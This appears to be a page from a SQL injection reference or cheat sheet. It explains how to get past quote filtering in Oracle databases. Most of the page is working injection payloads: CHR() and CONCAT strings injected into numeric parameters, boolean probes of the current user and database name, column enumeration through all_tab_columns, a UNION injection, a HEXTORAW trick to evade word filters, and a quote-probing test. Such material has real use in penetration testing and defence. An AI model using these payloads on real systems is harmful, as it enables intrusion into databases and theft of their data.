---
title: Avoiding Quotations
description: Techniques to bypass quotation filters in Oracle SQL injection
category: Injection Techniques
order: 8
tags: ["filter bypass", "quotation", "string manipulation"]
lastUpdated: 2026-10-08
---

When the application filters or escapes single quotes, string literals are no longer available to an injection. This matters most in numeric injection points (for example `?id=1`), where no quote is needed to break out of the original query, but every string value in the payload would normally need one. Oracle can build any string from character codes instead.

## Character Functions

| Function                | Description                               | Example                    |
| ----------------------- | ----------------------------------------- | -------------------------- |
| `CHR(n)`                | Character for a code in the database set  | `CHR(65)` returns `A`      |
| `NCHR(n)`               | Character for a code in the national set  | `NCHR(65)` returns `A`     |
| `ASCII(str)`            | Code of the first character               | `ASCII(USER)` returns `83` |
| `CONCAT(a, b)`          | Concatenates two strings (same as `\|\|`) | `CONCAT(CHR(65), CHR(66))` |
| `SUBSTR(str, pos, len)` | Extracts part of a string                 | `SUBSTR(USER, 1, 1)`       |
| `LENGTH(str)`           | Length of a string                        | `LENGTH(USER)`             |

Oracle has no `CHAR()` function (`CHAR` is a data type) and no `0x` hexadecimal literals, so the SQL Server and MySQL forms of these techniques do not work.

## Building Strings with CHR()

Each character becomes `CHR(code)`, joined with `||`:

```sql
-- 'admin' without quotes
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

In a numeric injection point:

```sql
-- Original query: SELECT * FROM users WHERE id = <input>
1 OR username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--
```

If `||` is filtered too, nest `CONCAT()`, which takes two arguments:

```sql
1 AND username=CONCAT(CONCAT(CONCAT(CONCAT(CHR(97),CHR(100)),CHR(109)),CHR(105)),CHR(110))--
```

## Values That Need No String at All

Many useful values are available from functions and pseudo-columns, so the payload compares numbers rather than strings:

```sql
-- Length and characters of the current user, compared as numbers
1 AND LENGTH(USER)=6--
1 AND ASCII(SUBSTR(USER,1,1))=83--

-- Compare the current user with a CHR() string ('SYSTEM')
1 AND USER=CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)--
```

`SYS_CONTEXT()` takes string arguments, which can be built the same way:

```sql
-- SYS_CONTEXT('USERENV','DB_NAME') = 'FREEPDB1'
1 AND SYS_CONTEXT(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(69)||CHR(78)||CHR(86),CHR(68)||CHR(66)||CHR(95)||CHR(78)||CHR(65)||CHR(77)||CHR(69))=CHR(70)||CHR(82)||CHR(69)||CHR(69)||CHR(80)||CHR(68)||CHR(66)||CHR(49)--
```

## Table and Column Names

Identifiers never need quotes: `users`, `all_tables` and `username` are written as-is. Quotes are only needed when a payload compares a name stored as data in the data dictionary, and `CHR()` covers that:

```sql
-- Columns of the USERS table
SELECT column_name FROM all_tab_columns WHERE table_name=CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)
```

## Combining with UNION

```sql
-- Original query returns 6 columns; the injected row needs no quotes
0 UNION SELECT 1,CHR(97)||CHR(100),NULL,NULL,NULL,NULL FROM dual--
```

## Hiding String Content

When quotes are allowed but certain words are blocked (for example `admin`), a hex string hides the word. This still uses quotes, so it does not help when quotes themselves are filtered:

```sql
1 AND username=UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('61646D696E'))--
```

## Testing for Quote Filtering

Send a lone single quote. An Oracle error such as `ORA-01756: quoted string not properly terminated` means quotes reach the query unescaped; a normal response means they are escaped or stripped, and the techniques above apply.

Oracle does not treat a backslash as an escape character, so an application that "escapes" quotes by adding a backslash (`\'`) still lets them through.
